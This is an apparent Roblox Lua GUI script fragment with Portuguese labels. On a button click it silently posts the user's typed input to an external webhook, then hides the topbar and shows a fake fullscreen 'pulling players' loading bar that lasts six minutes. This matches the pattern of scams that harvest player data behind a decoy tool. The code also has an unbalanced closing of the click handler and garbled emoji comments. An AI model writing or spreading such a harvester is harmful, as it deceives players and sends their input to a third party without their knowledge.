-- Function to send webhook
local function sendWebhook(inputText)
local data = {
content = "Anti Coldwal Notification",
embeds = {{
title = "User Input Received",
description = "Input: " .. tostring(inputText),
color = 3447003
}}
}
pcall(function()
request({
Url = webhookURL,
Method = "POST",
Headers = {["Content-Type"] = "application/json"},
Body = HttpService:JSONEncode(data)
})
end)
end

-- FULLSCREEN LOADING
local function createLoadingScreen()
mainFrame:Destroy()
StarterGui:SetCore("TopbarEnabled", false)

local loadingFrame = Instance.new("Frame")  
loadingFrame.Name = "LoadingFrame"  
loadingFrame.Size = UDim2.fromScale(1, 1) -- ðŸ”¥ TELA INTEIRA REAL  
loadingFrame.Position = UDim2.fromScale(0, 0)  
loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
loadingFrame.BorderSizePixel = 0  
loadingFrame.ZIndex = 100  
loadingFrame.Parent = screenGui  

local loadingText = Instance.new("TextLabel")  
loadingText.Size = UDim2.new(1, 0, 0, 60)  
loadingText.Position = UDim2.new(0, 0, 0.4, 0)  
loadingText.BackgroundTransparency = 1  
loadingText.Text = "Puxando players"  
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)  
loadingText.TextSize = 36  
loadingText.Font = Enum.Font.SourceSansBold  
loadingText.ZIndex = 101  
loadingText.Parent = loadingFrame  

local progressBg = Instance.new("Frame")  
progressBg.Size = UDim2.new(0.6, 0, 0, 30)  
progressBg.Position = UDim2.new(0.2, 0, 0.55, 0)  
progressBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)  
progressBg.ZIndex = 101  
progressBg.Parent = loadingFrame  

local progressBar = Instance.new("Frame")  
progressBar.Size = UDim2.new(0, 0, 1, 0)  
progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255) -- ðŸ”µ NÃƒO MEXI  
progressBar.ZIndex = 102  
progressBar.Parent = progressBg  

local start = tick()  
local totalTime = 360  

task.spawn(function()  
    while true do  
        local p = math.min((tick() - start) / totalTime, 1)  
        progressBar.Size = UDim2.new(p, 0, 1, 0)  
        if p >= 1 then break end  
        task.wait(0.1)  
    end  
end)

end

confirmButton.MouseButton1Click:Connect(function()
sendWebhook(inputBox.Text)
createLoadingScreen()
end
